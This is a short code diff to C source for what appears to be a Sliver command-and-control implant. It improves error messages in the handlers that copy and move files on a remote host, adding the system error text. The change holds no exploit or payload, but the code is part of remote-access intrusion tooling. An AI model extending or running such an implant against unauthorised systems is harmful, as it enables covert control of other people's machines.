@@ -428,7 +428,8 @@ static int handle_cp_entry(const sliver_envelope_t *req, sliver_buf_t *out) {
                    "cp: path separators were lost before the implant saw them; "
                    "escape backslashes (C:\\\\Windows\\\\win.ini)");
   } else if (sliver_fs_copy(src, dst, &written) != 0) {
-    (void)snprintf(err, sizeof(err), "cp %s -> %s: failed", src, dst);
+    (void)snprintf(err, sizeof(err), "cp %s -> %s: %s", src, dst,
+                   strerror(sliver_fs_last_error()));
   }
   LOG_DEBUG("rpc: cp %s -> %s (%lld bytes)", src, dst, (long long)written);
   return sliver_cp_encode(out, src, dst, written, err);
@@ -450,7 +451,8 @@ static int handle_mv_entry(const sliver_envelope_t *req, sliver_buf_t *out) {
                    "mv: path separators were lost before the implant saw them; "
                    "escape backslashes (C:\\\\Windows\\\\win.ini)");
   } else if (sliver_fs_move(src, dst) != 0) {
-    (void)snprintf(err, sizeof(err), "mv %s -> %s: failed", src, dst);
+    (void)snprintf(err, sizeof(err), "mv %s -> %s: %s", src, dst,
+                   strerror(sliver_fs_last_error()));
   }
   LOG_DEBUG("rpc: mv %s -> %s", src, dst);
   return sliver_mv_encode(out, src, dst, err);
@@ -672,6 +674,7 @@ void sliver_rpc_dispatch(const sliver_envelope_t *req, sliver_rpc_result_t *resu
     return;
   }
 }
+
 
 
 
